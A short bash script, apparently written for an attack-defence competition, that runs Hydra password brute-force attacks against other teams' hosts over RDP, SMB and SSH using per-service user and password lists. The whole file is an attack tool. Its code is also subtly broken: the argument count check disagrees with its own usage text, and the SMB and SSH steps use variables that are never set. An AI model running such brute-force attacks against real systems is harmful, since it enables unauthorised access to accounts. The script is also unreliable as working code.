#!/bin/bash

# Check if correct number of arguments are supplied
if [ "$#" -ne 4 ]; then
    echo "Usage: $0 <Team number> <Domain> <Resource directory>"
    echo "Example: $0 13 16 pvp.swift ./resources"
    echo "./resources should contain directories resources/userlist and resources/passlist"
    echo "Each resource should be lowercase and have the alias of the service ('sunflower', etc.)"
    exit 1
fi

TARGET="$1"
DOMAIN="$2"
RESOURCE="$3"

# Check if password file exists
if [ ! -d "$RESOURCE"/passlist ]; then
    echo "[-] Error: Password directory not found."
    exit 1
fi

if [ ! -d "$RESOURCE"/userlist ]; then
    echo "[-] Error: User directory not found."
    exit 1
fi

echo "[*] Starting Hydra brute-force against team $TARGET for thehouse and sunflower"
echo "--------------------------------------------------"
# Run Hydra against RDP for Server 2019 and Server 2022
hydra -t 1 -V -f -L "$RESOURCE/userlist/sunflower" -P "$RESOURCE/passlist/sunflower" rdp://$DOMAIN/172.16.$TARGET.51
hydra -t 1 -V -f -L "$RESOURCE/userlist/thehouse" -P "$RESOURCE/passlist/thehouse" rdp://$DOMAIN/172.16.$TARGET.52

echo "[*] Starting Hydra SMB brute-force against team $TARGET"
echo "--------------------------------------------------"

# Run Hydra against SMB for Server 2019
hydra -t 1 -V -f -L "$USER_FILE" -P "$PASS_FILE" -m "$DOMAIN" smb://172.16.$TARGET.51

echo "[*] Starting Hydra SSH brute-force against $TARGET_IP"
echo "--------------------------------------------------"
# Run Hydra against SSH
hydra -L "$RESOURCE/userlist/peashooter" -P "$RESOURCE/passlist/peashooter" ssh://"$TARGET_IP"
